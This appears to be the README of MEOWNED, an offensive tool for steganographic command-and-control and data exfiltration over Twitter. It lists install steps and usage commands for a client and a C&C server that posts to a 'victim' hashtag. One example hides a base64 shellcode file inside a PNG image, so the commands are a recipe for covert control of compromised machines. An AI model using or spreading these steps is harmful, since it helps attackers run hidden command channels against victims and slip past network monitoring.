# MEOWNED
MEOWNED (MEssages Over tWitter ¿stegaNography? Exfiltrating Data)

## Installation
* pip3 install python-twitter
* pip3 install Stegano

## Usage
### Source Image
The image should be a .png, preferably by passed through http://ravenworks.ca/twitimagefix/ in order to prevent twitter image compression.

### Client 
* > python meopwn_cli

### C&C
* > python meopwn_srv [victim_hashtah] [image] [message]
* > python3 meopwn_srv.py victim_hastag grumpy.png -f "shellcodes/messageBox.b64"
* > python3 reveal.py "./output-imgs/grumpy1.png"
* > python3 hide.py "./source-imgs/grumpy.png" "./output-imgs/grumpy1.png" "SECRET"



